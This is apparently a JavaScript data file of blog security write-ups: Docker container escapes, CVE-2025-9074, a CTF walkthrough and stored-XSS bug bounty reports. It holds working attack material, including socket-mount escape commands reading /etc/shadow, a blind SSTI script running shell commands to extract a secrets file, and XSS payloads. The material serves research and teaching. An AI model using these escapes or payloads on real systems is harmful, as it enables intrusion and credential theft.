// Writeups shown on the index. Posts with `full` render the whole article here;
// posts with `body` show a summary + link to the original.
const POSTS=[
 {id:"docker-escape",date:"2026-01-17",y:"2026",m:"Jan 17",title:"Docker escape: breaking out of containers",tag:"research",src:"mindpatch.net",url:"https://www.mindpatch.net/posts/docker-escape/",
  full:`<p>Containers aren&#x27;t VMs. This is the fundamental reason Docker escapes exist.</p>
<p>When you spin up a VM, you&#x27;re getting a completely separate kernel, virtual hardware, the whole deal. The hypervisor sits between your VM and the host, and what happens inside stays inside.</p>
<p>Docker? It&#x27;s just a fancy process. Your container shares the same kernel as your host machine. The isolation comes from Linux features like namespaces, cgroups, and seccomp - not from hardware separation. This makes containers lightweight and fast, but it also means the barrier between container and host is thinner than most people realize.</p>
<h2>How Docker Works Under the Hood</h2>
<p>When you run <code>docker run</code>, here&#x27;s what actually happens:</p>
<pre class="mermaid">flowchart LR
    A[Docker CLI] --&gt;|HTTP via| B[Unix Socket] --&gt; C[Docker Daemon] --&gt; D[containerd] --&gt; E[runc] --&gt; F[Linux Kernel]</pre>
<p>Your CLI talks to the Docker daemon through a Unix socket at <code>/var/run/docker.sock</code>. Why a Unix socket and not TCP? Two reasons:</p>
<ol><li><strong>Security through filesystem permissions</strong> - Unix sockets are files, so you can control access with standard file permissions. Only users in the <code>docker</code> group (or root) can read/write to the socket. With TCP, you&#x27;d need additional authentication layers.</li><li><strong>No network exposure</strong> - A Unix socket only exists on the local filesystem. There&#x27;s no port to accidentally expose to the network, no firewall rules to mess up. It&#x27;s local-only by design.</li></ol>
<p>The socket is essentially an HTTP API endpoint. When you run <code>docker ps</code>, your CLI is making an HTTP GET request to the daemon through that socket. When you run <code>docker run</code>, it&#x27;s a POST request with container configuration as JSON. The daemon runs as root and does all the heavy lifting.</p>
<p>From there, the daemon hands things off to <strong>containerd</strong> (the high-level runtime). Containerd manages the container lifecycle - pulling images, managing storage snapshots, handling container states. It&#x27;s the layer that makes containers feel like persistent objects rather than just processes.</p>
<p>Containerd then passes execution to <strong>runc</strong> (the low-level runtime). This is where containers actually get created. Runc talks directly to the Linux kernel to set up all the isolation primitives. It&#x27;s a small, focused tool that implements the OCI runtime specification.</p>
<h3>The Isolation Mechanisms</h3>
<pre class="mermaid">flowchart TB
    A[Container Process] --&gt; B[Namespaces]
    A --&gt; C[Cgroups]
    A --&gt; D[Seccomp]
    A --&gt; E[Capabilities]
    A --&gt; F[AppArmor/SELinux]
    B &amp; C &amp; D &amp; E &amp; F --&gt; G[Linux Kernel]</pre>
<p><strong>Namespaces</strong> are the core of container isolation. Linux supports several namespace types:</p>
<ul><li><strong>PID namespace</strong> - Container sees its own process tree, with its init as PID 1</li><li><strong>NET namespace</strong> - Container gets its own network stack, interfaces, routing tables</li><li><strong>MNT namespace</strong> - Container has its own filesystem mount points</li><li><strong>UTS namespace</strong> - Container can have its own hostname</li><li><strong>IPC namespace</strong> - Isolated inter-process communication</li><li><strong>USER namespace</strong> - Maps container UIDs to different host UIDs</li></ul>
<p>Each namespace makes the container think it&#x27;s alone on the system. But here&#x27;s the thing - the kernel still sees everything. Namespaces are just filters on what a process can see, not actual separation.</p>
<p><strong>Cgroups</strong> (control groups) handle resource limits. You can cap CPU usage, memory consumption, disk I/O, network bandwidth. Without these, a container could trivially DoS the host by consuming all resources. Cgroups also provide resource accounting - you can see exactly how much CPU/memory each container is using.</p>
<p><strong>Seccomp</strong> (secure computing mode) filters syscalls at the kernel level. Docker&#x27;s default seccomp profile blocks around 44 syscalls out of 300+. Things like <code>reboot</code>, <code>mount</code>, <code>swapon</code>, <code>clock_settime</code> - syscalls that could affect the host system. If a containerized process tries to call a blocked syscall, it gets killed with SIGSYS.</p>
<p><strong>Capabilities</strong> break the monolithic root privilege into ~40 distinct capabilities. Instead of &quot;can do everything&quot; you get granular permissions like:</p>
<ul><li><code>CAP_NET_ADMIN</code> - modify network settings</li><li><code>CAP_SYS_ADMIN</code> - the catch-all &quot;almost root&quot; capability</li><li><code>CAP_SYS_PTRACE</code> - trace/debug other processes</li><li><code>CAP_SYS_MODULE</code> - load kernel modules</li></ul>
<p>Docker drops most capabilities by default. A container running as root inside still can&#x27;t do most privileged operations unless explicitly granted.</p>
<p><strong>AppArmor/SELinux</strong> are Linux Security Modules that provide mandatory access control. Even if a process is root with all capabilities, LSMs can still block actions based on security policies. They&#x27;re the last line of defense when everything else fails.</p>
<p>Sounds pretty secure right? Layer upon layer of isolation. The problem is these are all software boundaries enforced by the same kernel the container is using. Misconfigure one layer, find a bug in the kernel, or combine several &quot;harmless&quot; permissions - and suddenly you&#x27;re on the host.</p>
<h2>Escape Techniques</h2>
<h3>1. Docker Socket Mount</h3>
<p>This is the most common escape I see in the wild, and honestly it&#x27;s embarrassing how often it happens.</p>
<p>Some applications need to interact with Docker - CI/CD pipelines, monitoring tools, container orchestration. The &quot;easy&quot; solution is mounting the Docker socket into the container: <code>-v /var/run/docker.sock:/var/run/docker.sock</code></p>
<p>The moment you do this, you&#x27;ve given that container full control over the Docker daemon. The daemon runs as root on the host. So now the container can create new containers with any configuration it wants - including one that mounts the entire host filesystem with full privileges.</p>
<pre class="mermaid">flowchart LR
    A[Attacker Container] --&gt;|Access| B[docker.sock]
    B --&gt;|Full Control| C[Docker Daemon]
    C --&gt;|Create| D[New Privileged Container]
    D --&gt;|Mount /| E[Host Filesystem]
    E --&gt;|chroot| F[Root on Host]</pre>
<pre><code class="language-bash"># Vulnerable setup
docker run -v /var/run/docker.sock:/var/run/docker.sock -it ubuntu

# Inside container - install docker cli
apt update &amp;&amp; apt install -y docker.io

# Spawn privileged container with host root mounted
docker run -it -v /:/host --privileged ubuntu chroot /host

# You&#x27;re now root on the host
root@host:/# cat /etc/shadow
root:$6$xyz$...:19000:0:99999:7:::</code></pre>
<p>Game over.</p>
<h4>CVE-2025-9074: Docker Desktop API Exposure</h4>
<p>This vulnerability made the socket mount issue even worse on Docker Desktop. The Docker Engine API was accessible <strong>without authentication</strong> via an internal TCP socket (typically <code>192.168.65.7:2375</code>) from inside any container - even without explicitly mounting the socket.</p>
<p>This meant any container running on Docker Desktop could connect to <code>http://192.168.65.7:2375</code> and have full control over the Docker daemon. No socket mount required. The fix involved properly restricting access to this internal API endpoint, but if you&#x27;re running an unpatched version of Docker Desktop, every container you run has implicit access to the daemon.</p>
<h3>2. Sensitive Directory Mounts</h3>
<p>Similar problem, different flavor. Sometimes people mount host directories into containers for convenience - config files, home directories, whatever.</p>
<p>Mounting <code>/etc</code> means the container can read <code>/etc/shadow</code> (password hashes) or add entries to <code>/etc/passwd</code>. Mounting <code>/root</code> gives access to SSH keys. Even mounting something seemingly innocent like <code>/var/log</code> can leak sensitive information.</p>
<pre class="mermaid">flowchart LR
    A[Host /etc] --&gt;|mounted into| B[Container]
    B --&gt; C[Read /etc/shadow]
    B --&gt; D[Write to /etc/passwd]
    C --&gt; E[Crack passwords]
    D --&gt; F[Backdoor user]</pre>
<p>If the mount is read-write, the attacker can also modify these files. Adding a backdoor user to passwd or dropping an SSH key into authorized_keys gives persistent access.</p>
<h3>3. The uevent_helper Attack</h3>
<p>This one&#x27;s interesting because it abuses a legitimate kernel feature.</p>
<p>Linux has a mechanism called <code>uevent_helper</code> at <code>/sys/kernel/uevent_helper</code>. Whenever a device event happens in the kernel - USB plugged in, network interface changes state, any hardware event - the kernel can execute a userspace helper program specified in this file.</p>
<p>Here&#x27;s the catch: the kernel doesn&#x27;t know about container namespaces when it executes this helper. It runs in the kernel&#x27;s context, which means the host&#x27;s context.</p>
<pre class="mermaid">sequenceDiagram
    participant A as Attacker (Container)
    participant S as /sys/kernel/uevent_helper
    participant K as Linux Kernel
    participant H as Host System

    A-&gt;&gt;S: Write path to helper script
    A-&gt;&gt;K: Trigger device event
    K-&gt;&gt;K: Device event fires
    K-&gt;&gt;H: Execute helper script as root
    Note over H: Script runs in HOST context
    H--&gt;&gt;A: Container escape achieved</pre>
<p>The good news is this requires <code>/sys</code> to be mounted read-write, which it shouldn&#x27;t be. Modern container runtimes mount it read-only by default. But if someone&#x27;s running an older setup or explicitly mounted it writable, this attack path exists.</p>
<h3>4. Privileged Containers</h3>
<p>Running a container with <code>--privileged</code> basically turns off all the security features I mentioned earlier. Full access to host devices, all capabilities enabled (including <code>CAP_SYS_ADMIN</code> which allows mounting filesystems), no seccomp filtering.</p>
<p>At that point the container is essentially root on the host with a slightly different filesystem view. Mounting the host disk, accessing <code>/dev/mem</code>, manipulating cgroups - all fair game.</p>
<pre class="mermaid">flowchart LR
    A[--privileged] --&gt; B[Full /dev access] --&gt; C[mount /dev/sda1] --&gt; D[Host Filesystem] --&gt; E[Root on Host]</pre>
<h3>5. Process Injection with SYS_PTRACE</h3>
<p>If a container has the <code>CAP_SYS_PTRACE</code> capability and shares the host&#x27;s PID namespace (<code>--pid=host</code>), it can use ptrace to attach to host processes.</p>
<p>Ptrace is the debugging interface - it&#x27;s how gdb works. With it, you can read and write process memory, modify registers, inject code.</p>
<pre class="mermaid">sequenceDiagram
    participant C as Container (CAP_SYS_PTRACE)
    participant P as Host Process (PID 1)
    participant M as Process Memory
    participant H as Host

    C-&gt;&gt;P: PTRACE_ATTACH
    P--&gt;&gt;C: Process stopped
    C-&gt;&gt;M: PTRACE_GETREGS
    C-&gt;&gt;M: inject shellcode
    C-&gt;&gt;M: PTRACE_SETREGS
    C-&gt;&gt;P: PTRACE_DETACH
    P-&gt;&gt;H: Execute shellcode as root
    Note over H: Code runs in host context</pre>
<p>The technique attaches to a running host process, overwrites its memory at the instruction pointer with a small <code>execve(&quot;/bin/sh&quot;)</code> shellcode, points the instruction pointer at it, and detaches. When the process resumes, it runs the injected code in the host context. Full source for the lab is in my <a href="https://github.com/MindPatch/zeronleft_labs" target="_blank" rel="noopener">zeronleft_labs</a> repo.</p>
<h3>6. Kernel Exploits</h3>
<p>Since containers share the kernel with the host, any kernel vulnerability is exploitable from inside a container. DirtyCow, DirtyPipe, whatever the next big kernel bug is - if it gives you privilege escalation, it works from containers too.</p>
<pre class="mermaid">flowchart LR
    A[Container] --&gt;|shares| B[Host Kernel]
    B --&gt;|exploit| C[CVE-2022-0847]
    C --&gt; D[Root on Host]</pre>
<p>This is fundamentally different from VMs where a kernel exploit only gives you the VM&#x27;s kernel, not the host&#x27;s. With containers, kernel security is container security.</p>
<h4>Loading Malicious Kernel Modules</h4>
<p>If a container has <code>CAP_SYS_MODULE</code> capability (or runs privileged), it can load arbitrary kernel modules into the host kernel. This is basically game over - a kernel module runs with full kernel privileges, completely outside any container isolation.</p>
<p>The takeaway across all of these: container isolation is only as strong as its configuration. Drop capabilities, never mount the docker socket, keep <code>/sys</code> read-only, avoid <code>--privileged</code>, and keep the host kernel patched.</p>
<h2>References</h2>
<ul><li><a href="https://docs.docker.com/engine/security/" target="_blank" rel="noopener">Docker Security Best Practices</a></li><li><a href="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/" target="_blank" rel="noopener">Understanding Docker Container Escapes</a></li><li><a href="https://man7.org/linux/man-pages/man7/capabilities.7.html" target="_blank" rel="noopener">Linux Capabilities</a></li><li><a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation" target="_blank" rel="noopener">Docker breakout / privilege escalation (HackTricks)</a></li><li><a href="https://github.com/MindPatch/zeronleft_labs" target="_blank" rel="noopener">zeronleft_labs</a></li></ul>`},
 {id:"docker-escape-ssrf",date:"2025-09-01",y:"2025",m:"Sep 1",title:"CVE-2025-9074: Docker Desktop container escape via SSRF",tag:"research",cve:"CVE-2025-9074",src:"mindpatch.net",url:"https://www.mindpatch.net/posts/docker-escape-ssrf/",
  full:`<h2>Overview</h2>
<p>CVE-2025-9074 is a container escape in Docker Desktop, rated CVSS 9.3. What makes it nasty isn't some clever exploit chain, it's that there's barely any exploit at all. Any container could reach the Docker Engine API and take over the host with a few plain HTTP requests. No socket mount, no privileged flag, no kernel bug.</p>
<p>It affects Docker Desktop on Windows (WSL2 backend) and macOS. The whole thing comes down to one misconfiguration: the Docker daemon was listening on an internal address, <code>192.168.65.7:2375</code>, that every container could route to, with no authentication in front of it.</p>
<p>Credit for finding and disclosing this goes to Felix Boulet and Philippe Dugre. Their write-ups are linked at the bottom.</p>

<h2>How the API got exposed</h2>
<p>Docker Desktop doesn't run the daemon on your host directly. On Windows it lives inside a WSL2 VM (a real Linux kernel under Hyper-V); on macOS, a similar lightweight VM. Your <code>docker</code> CLI on the host is just an HTTP client talking to <code>dockerd</code> inside that VM.</p>
<p>On native Linux this conversation happens over a Unix socket (<code>/var/run/docker.sock</code>) that's protected by filesystem permissions and never touches the network. Docker Desktop can't use that trick cleanly across the host/VM boundary, so it exposed the API over TCP instead. And that's where it went wrong. Three things lined up:</p>
<ol><li><strong>The daemon bound to <code>0.0.0.0:2375</code></strong> instead of localhost, so anything on the VM's network could reach it.</li>
<li><strong>No authentication.</strong> No keys, no certs, nothing. Any request was treated as legitimate.</li>
<li><strong>Containers could route to that network.</strong> From inside a container, <code>192.168.65.7:2375</code> was directly reachable over <code>eth0</code>.</li></ol>
<p>Put those together and every container on the machine had the exact same power over the daemon as an admin typing <code>docker</code> on the host. And the daemon runs as root.</p>
<pre class="mermaid">flowchart TB
    subgraph Host["Windows / macOS Host"]
        A["Docker CLI"]
    end
    subgraph VM["Docker VM - 192.168.65.7"]
        B["TCP :2375&lt;br/&gt;0.0.0.0 · NO AUTH"]
        C["dockerd (root)"]
    end
    subgraph Net["Container Network - 172.17.0.0/16"]
        H["Malicious Container"]
    end
    A --&gt;|legit calls| B --&gt; C
    H ==&gt;|"same API access"| B
    style B fill:#4a1520,stroke:#d45574,color:#e0e0e0
    style H fill:#4a1520,stroke:#d45574,color:#e0e0e0</pre>
<p>Confirming it was reachable took one request:</p>
<pre><code class="language-bash"># From inside any container
curl -s http://192.168.65.7:2375/_ping
# OK      &lt;- no auth, no questions asked

ip route show
# default via 172.17.0.1 dev eth0
# 172.17.0.0/16 dev eth0 scope link
# 192.168.65.0/24 dev eth0 scope link   &lt;- VM network is right there</code></pre>

<h2>From API access to host root</h2>
<p>Once you can talk to the daemon, escaping is just asking it to do something dumb on your behalf. Every path below is a normal Docker API call, the same one the CLI makes.</p>
<pre class="mermaid">flowchart LR
    A[Reach :2375] --&gt; B[Recon: /info, /containers/json]
    B --&gt; C[Create container with&lt;br/&gt;bind mount / or --privileged]
    C --&gt; D[Read/write host FS&lt;br/&gt;· Full host control]</pre>
<p>The classic move is to create a new container that bind-mounts the host root and gives yourself a shell in it:</p>
<pre><code class="language-bash"># POST /containers/create with:
#   HostConfig.Binds = ["/:/host"]
#   HostConfig.Privileged = true
# then start it and you're reading /host/etc/shadow, dropping SSH keys, whatever.</code></pre>
<p>You never needed to mount <code>docker.sock</code> into the container. The network path <em>was</em> the socket.</p>

<h2>Testing for it</h2>
<p><small>WARNING: Educational use only. Test in isolated environments you own.</small></p>
<p>If you want to see it live, there's a short PoC video: <a href="https://www.youtube.com/watch?v=CiPbB3ZbEPk" target="_blank" rel="noopener">watch on YouTube &#8599;</a></p>
<p>To reproduce, install a Docker Desktop build older than 4.44.3 (4.44.0, 4.43.x, etc.) on a throwaway machine, then run a container and check whether the API answers:</p>
<pre><code class="language-bash">docker run --rm -it python:3.11-alpine sh
pip install requests</code></pre>
<p>This script just probes the endpoint, it doesn't do anything destructive:</p>
<pre><code class="language-python">#!/usr/bin/env python3
"""CVE-2025-9074 check - test only on systems you own."""
import requests

TARGET = "http://192.168.65.7:2375"

def check():
    try:
        r = requests.get(f"{TARGET}/_ping", timeout=3)
    except requests.exceptions.RequestException:
        print("[-] No route to the API - likely patched or well configured.")
        return

    if r.status_code == 200 and r.text.strip() == "OK":
        print("[!] VULNERABLE: Docker API is reachable from this container.")
        info = requests.get(f"{TARGET}/info", timeout=5).json()
        print(f"    Docker:  {info.get('ServerVersion')}")
        print(f"    Host OS: {info.get('OperatingSystem')}")
        containers = requests.get(f"{TARGET}/containers/json?all=1", timeout=5).json()
        print(f"    Sees {len(containers)} containers on the host.")
    else:
        print("[-] Endpoint responded oddly - probably not vulnerable.")

if __name__ == "__main__":
    check()</code></pre>
<p>If it comes back <code>VULNERABLE</code> and prints the host's Docker version and container list, that's your proof: a container with no special privileges is reading host-level daemon state. A patched or properly configured system just can't reach the endpoint.</p>

<h2>The fix</h2>
<p>Docker shipped the fix in Docker Desktop 4.44.3 on August 20, 2025. It stops the daemon from listening in a way containers can reach, closing the network path without breaking the normal CLI workflow.</p>
<p>If you're running Docker Desktop, update to 4.44.3 or later. It's a one-line answer to a critical bug.</p>

<h2>Takeaway</h2>
<p>The interesting thing about CVE-2025-9074 is how boring the exploit is. No memory corruption, no capability abuse, no kernel exploit, just an API that should have been on localhost, listening for anyone who asked. Container isolation held up fine; the management plane sitting next to it did not.</p>
<p>If you run containers, it's worth remembering that the daemon is the real crown jewel. Anything a container can reach on the network deserves the same scrutiny as anything it can reach on disk.</p>

<h2>References</h2>
<ul><li><a href="https://pvotal.tech/breaking-dockers-isolation-using-docker-cve-2025-9074/" target="_blank" rel="noopener">Felix Boulet: Breaking Docker's Isolation using Docker CVE-2025-9074</a></li>
<li><a href="https://blog.qwertysecurity.com/Articles/blog3.html" target="_blank" rel="noopener">Philippe Dugre: Docker Desktop Container Escape</a></li>
<li><a href="https://docs.docker.com/engine/security/" target="_blank" rel="noopener">Docker Security Best Practices</a></li>
<li><a href="https://docs.docker.com/engine/api/" target="_blank" rel="noopener">Docker Engine API Documentation</a></li></ul>`},
 {id:"cit-ctf",date:"2025-04-28",y:"2025",m:"Apr 28",title:"CIT CTF 2025: solving all web challenges",tag:"ctf",src:"Medium",url:"https://mindpatch.medium.com/cit-ctf-2025-solving-all-web-challenges-e9697670ae1f",
  full:`<p>Hello, I joined the CTF for fun during the weekend.</p>
<p>I focused on web challenges and completed all challenges in this category. The challenges were straightforward and made for a fun weekend.</p>
<h2>Mr. Chatbot</h2>
<p>The application shows a welcome page asking for your name, then puts you in a chat with a bot. The goal was to get the Flag from the bot. This wasn&#x27;t an LLM attack - responses came from JavaScript files.</p>
<p>After entering a name, you get a session value that can be decoded with flask-unsign:</p>
<pre><code class="language-bash">$ flask-unsign --unsign --cookie &quot;eyJhZG1pbiI6IjAiLCJuYW1lIjoiaGFja2VyIn0.aA8u-Q.GRwPzCvfn4k_zUDDzo_XL83fKJk&quot; --secret=&quot;9f3IC3uj9^zZ&quot;
[*] Session decodes to: {&#x27;admin&#x27;: &#x27;0&#x27;, &#x27;name&#x27;: &#x27;hacker&#x27;}</code></pre>
<p>After trying injections with no luck, I did parameter fuzzing and found the <code>admin=1</code> parameter. This revealed new session data:</p>
<pre><code class="language-bash">$ flask-unsign --unsign --cookie &quot;.eJwdzE0Lgj...&quot; --secret=&quot;9f3IC3uj9^zZ&quot;
[*] Session decodes to: {&#x27;admin&#x27;: &#x27;1&#x27;, &#x27;name&#x27;: &quot;hacker&quot;, &#x27;uid&#x27;: &#x27;...&#x27;}</code></pre>
<p>As you see there&#x27;s a new variable (<strong>UID</strong>), I tried doing some injections like SSTI and got it :)</p>
<p>Well The idea now to get <strong>secrets.txt</strong> file blindly, I wrote a script that uses <strong>head</strong> command if char is valid then sleep 5 seconds</p>
<pre><code class="language-python">import requests
import string
import time

CHARS = string.printable
FOUND = &quot;&quot;
POSITION = len(FOUND) + 1

def make_payload(position, the_char):
    cmd = f&#x27;[ &quot;$(head -c {position} secrets.txt | tail -c 1)&quot; = &quot;{the_char}&quot; ] &amp;&amp; sleep 5&#x27;
    payload = &quot;{{ self.__init__.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;&quot;+cmd+&quot;&#x27;).read() }}&quot;
    return payload

def exploit():
    global FOUND, POSITION
    max_positions = 100
    consecutive_spaces = 0
    while POSITION &lt;= max_positions and consecutive_spaces &lt; 5:
        found_char = False
        for ch in CHARS:
            if ch in [&#x27;&quot;&#x27;, &#x27;\\\\&#x27;, &#x27;\`&#x27;, &#x27;$&#x27;, &#x27;&amp;&#x27;, &#x27;|&#x27;, &#x27;;&#x27;, &#x27;\\n&#x27;, &#x27;\\r&#x27;]:
                continue
            start_time = time.time()
            try:
                r = requests.post(
                    &quot;http://target/&quot;,
                    allow_redirects=False,
                    data={&quot;name&quot;: make_payload(POSITION, ch), &quot;admin&quot;: &quot;1&quot;},
                    timeout=10
                )
                if time.time() - start_time &gt;= 4.5:
                    FOUND += ch; found_char = True
                    consecutive_spaces = 0 if ch != &#x27; &#x27; else consecutive_spaces + 1
                    print(f&quot;pos {POSITION}: {ch}  -&gt;  {FOUND}&quot;)
                    break
            except requests.exceptions.Timeout:
                FOUND += ch; found_char = True
                consecutive_spaces = 0 if ch != &#x27; &#x27; else consecutive_spaces + 1
                break
        if not found_char:
            FOUND += &quot; &quot;; consecutive_spaces += 1
        POSITION += 1
        time.sleep(1)

if __name__ == &quot;__main__&quot;:
    exploit()
    print(&quot;secret:&quot;, FOUND)</code></pre>
<p>And after running it got the flag :)</p>
<pre><code class="language-bash">$ python exp.py
admin:9f3IC3uj9^zZ  CIT{18a7fbedb4f3548f}</code></pre>
<h2>How I Parsed your JSON</h2>
<p>This challenge reads JSON files locally and provides a SQL-like syntax to extract data. You can add <code>*</code> to the query to extract all columns.</p>
<p>The useful finding was converting the <code>container</code> parameter into a list with <code>?container[]=</code>. This showed a debug page with source code.</p>
<p>The code simply removes <code>../</code> and file extensions from the container name to prevent LFI. This can be bypassed with <code>..//file.txt.txt</code>.</p>
<pre><code>/select?record=*&amp;container=../../../..//app//secrets.txt.txt</code></pre>
<h2>Commit &amp; Order: Version Control Unit</h2>
<p>This challenge was straightforward. I discovered an exposed <code>/.git</code> directory on the server and dumped the repository using the git-dump tool.</p>
<p>After examining the commit history, I found older commits that contained the source code with hardcoded admin credentials. This is a common security mistake where developers remove sensitive information in later commits but forget that the data remains accessible in the Git history.</p>
<p>The steps to solve were:</p>
<ol><li>Identify the exposed Git repository at <code>/.git</code></li><li>Download the repository using git-dump</li><li>Review commit history with <code>git log</code></li><li>Check older commits with <code>git show [commit-hash]</code></li><li>Find the source code file containing the hardcoded admin password in admin.php</li><li>Use the credentials to access the admin panel and retrieve the flag</li></ol>
<h2>Breaking Authentication</h2>
<p>This challenge featured a straightforward SQL injection vulnerability in the login page.</p>
<p>Steps to solve:</p>
<ol><li>Accessed the database and dumped its contents</li><li>Found the flag stored in the &#x27;secrets&#x27; table</li></ol>
<p>Classic example of an unsanitized input field allowing SQL injection to compromise a web application&#x27;s authentication mechanism.</p>
<h2>Keeping Up with the Credentials</h2>
<p>This challenge required first solving another challenge to obtain valid username and password credentials.</p>
<p>Steps to solve:</p>
<ol><li>Used credentials obtained from the previous challenge to log in</li><li>After login, got redirected to <code>/debug.php</code> which was an empty page</li><li>Noticed that accessing <code>/admin.php</code> directly would automatically log you out</li><li>Modified the login request to include the parameter <code>admin=true</code> using POST method</li><li>Successfully redirected to <code>/admin.php</code> with admin privileges</li><li>Retrieved the flag from the admin page</li></ol>
<p>Pretty Simple :v</p>`},
 {id:"analysis-of-cve-2022-30781",date:"2025-01-10",y:"2025",m:"Jan 10",title:"CVE-2022-30781: how git fetch led to RCE in Gitea",tag:"research",cve:"CVE-2022-30781",src:"Medium",url:"https://mindpatch.medium.com/analysis-of-cve-2022-30781-5089f9616957",
  body:`<p>A root-cause analysis of CVE-2022-30781, a remote code execution bug in Gitea's repository migration feature. Gitea ran <code>git fetch</code> against a user-supplied remote, and an attacker-controlled value could smuggle in the <code>--upload-pack</code> option to run an arbitrary command on the server.</p>
  <h2>The chain</h2>
  <ul><li>Repo migration triggers a server-side <code>git fetch</code></li><li>The <code>--upload-pack</code> option lets you point Git at a command instead of the real helper</li><li>Injecting it turns "fetch a repo" into "run my command"</li></ul>
  <p>The Gitea team fixed it by using <code>--</code> to stop Git from treating the value as an option.</p>`},
 {id:"legacy-sdk-xss-account-takeover",date:"2025-03-14",y:"2025",m:"Mar 14",title:"Legacy SDK flaws: stored XSS to account takeover",tag:"bug bounty",src:"Medium",url:"https://mindpatch.medium.com/legacy-sdk-flaws-cause-stored-xss-and-account-takeover-ato-5b4ed6c1f13f",
  full:`<p>Alright, let me tell you a fun story about how a casual day of hunting bugs turned into a serious jackpot - all thanks to some forgotten open source library!</p>
<p>It started like any other day: coffee ready, Burp Suite fired up, and enthusiasm maxed out. I was testing a cool AI-driven reporting/training platform over at example.ai.</p>
<p>These folks were pretty solid when it came to securing their main endpoints; my usual payloads and tests didn&#x27;t reveal much initially. However, the moment I stumbled onto their <code>/reports</code> page, my curiosity went through the roof. This page was super interactive - it allowed users to create detailed, professional-looking reports with graphs, charts, images, markdown support, etc ..</p>
<p>I tried finding any bugs on this feature but didn&#x27;t ended well unfortunately</p>
<p>But after searching around their github organization repos I found a library called <code>utils_libs</code> and its README.md says that let you create report using python in automated way</p>
<p>and I revealed two versions of their report library: <code>utils.report.v1</code> and <code>utils_libs.report.v2</code>. Considering organizations often neglect older SDK versions during updates, I wondered whether the older <code>v1</code> endpoint might still be active</p>
<p>Curiosity piqued, I quickly whipped up a test script using the old, seemingly abandoned <code>v1</code> API:</p>
<pre><code class="language-python">import utils_libs
import utils_libs.reports.v1 as ul

# Setup credentials
entity = &quot;&lt;REPLACE&gt;&quot;
project = &quot;&lt;REPLACE&gt;&quot;
# Creating a sneaky report
report = ul.Report(
    entity=entity,
    project=project,
    title=&quot;XSS HERE BE AWARE&quot;,
    description=&quot;Never gonna give you up, never gonna let you down&quot;
)
# Injecting our little surprise
report.save()</code></pre>
<p>after running the script I got the report created on the UI successfully.</p>
<p>I add burpsuite in the mid of the library requests to track it down and I noticed it calls <strong>different endpoints</strong>!</p>
<p>When using this endpoint, there is no XSS (Cross-Site Scripting) filter applied to functions that are intended to add links for the report writer. Below is an example of how this vulnerability can be exploited:</p>
<pre><code class="language-python">import utils_libs
import utils_libs.reports.v1 as ul

# Initialize the utils_libs API
api = utils_libs.Api()
# Define the entity and project
entity = &quot;&lt;REPLACE&gt;&quot;  # Replace with your utils_libs entity
project = &quot;&lt;REPLACE&gt;&quot;  # Replace with your utils_libs project
# Create a new report
report = ul.Report(
    entity=entity,
    project=project,
    title=&quot;XSS HERE - BE AWARE&quot;,
    description=&quot;Never gonna give you up, never gonna let you down&quot;
)
# Add a block with an XSS payload
report.blocks = [ul.Twitter(&#x27;&quot;&gt;&lt;svg/onload=alert()&gt;&#x27;)]
# Save the report
report.save()</code></pre>
<p>This code successfully stored an XSS payload, which can be accessed via the URL <code>example.ai/reports/&lt;reportid&gt;</code>. Notably, this report can be viewed by anyone, even if they are not part of my organization</p>
<h2>But wait, there&#x27;s more!</h2>
<p>After the excitement of the first payout wore off, I thought, &quot;why not dig a bit deeper?&quot;</p>
<p>Revisiting their repository, I found another interesting feature - embedding videos into reports. Now, embedding videos seemed innocent enough, but experience taught me never to underestimate innocent-looking functionalities.</p>
<p>So, I gave it a try:</p>
<pre><code class="language-python">report = ul.Report(
    entity=entity,
    project=project,
    title=&quot;Another Sneaky XSS&quot;,
    description=&quot;Keep calm and hack responsibly&quot;
)
report.pages = [ul.Video(&#x27;javascript:alert()&#x27;)]
report.save()</code></pre>
<p>And bingo! Another stored XSS! But this wasn&#x27;t just any simple vulnerability - this time, it was even more impactful.</p>
<p>By chaining this XSS with another minor misconfiguration, I escalated it to <strong>full account takeover</strong>.</p>
<p>That meant I could completely control someone&#x27;s account just by tricking them into viewing my crafted report.</p>
<p>The team this time higher the impact and higher the bounty which is a good win</p>
<h2>Side Hint</h2>
<p>Always dig deeper into seemingly unrelated or forgotten resources. Old API docs, outdated Python SDKs, archived repositories, or forgotten JavaScript files might contain hidden parameters or endpoints. These endpoints often bypass filters or security checks because they aren&#x27;t actively maintained, potentially leading to undiscovered vulnerabilities.</p>
<p>And that&#x27;s it. Bye ..</p>`},
 {id:"solving-doxpit-challenge",date:"2024-08-20",y:"2024",m:"Aug 20",title:"HTB DoxPit challenge",tag:"ctf",src:"Medium",url:"https://mindpatch.medium.com/htb-solving-doxpit-challange-d1957f57b0b0",
  body:`<p>Walkthrough of the DoxPit web challenge on Hack The Box.</p>`},
 {id:"gitea-dos",date:"2023-02-22",y:"2023",m:"Feb 22",title:"With a single request, you can kill any Gitea server",tag:"disclosure",src:"Medium",url:"https://mindpatch.medium.com/with-a-single-request-you-can-kill-any-gitea-server-1275c5f3b226",
  body:`<p>A denial-of-service bug in Gitea 1.14.2: a single crafted issue comment forced the server to burn CPU while rendering it, enough to take the instance down. Reported and validated within two days.</p>
  <h2>Outcome</h2>
  <ul><li>Fixed in Gitea 1.14.3</li><li>Credited in the release notes</li></ul>`},
 {id:"ibm-rce",date:"2021-06-02",y:"2021",m:"Jun 2",title:"Remote code execution on an ibm.com subdomain",tag:"disclosure",src:"dev.to",url:"https://dev.to/knassar702/remote-code-execution-on-ibm-com-subdomain-4k96",
  body:`<p>An exposed Jenkins instance on an ibm.com subdomain led to remote code execution.</p>`},
 {id:"nokia-sqli",date:"2021-06-02",y:"2021",m:"Jun 2",title:"SQL injection on gdclive.nokia.com",tag:"disclosure",src:"dev.to",url:"https://dev.to/knassar702/sql-inection-on-gdclivenokia-com-c7c",
  body:`<p>Finding and reporting an SQL injection on a Nokia web property.</p>`},
 {id:"ibm-xss",date:"2021-06-02",y:"2021",m:"Jun 2",title:"Reflected XSS via JSONP on an ibm.com subdomain",tag:"disclosure",src:"dev.to",url:"https://dev.to/knassar702/reflected-xss-by-jsonp-on-ibm-com-subdomain-5aia",
  body:`<p>A JSONP callback parameter on an ibm.com subdomain reflected attacker input into script context, giving reflected XSS.</p>`}
];
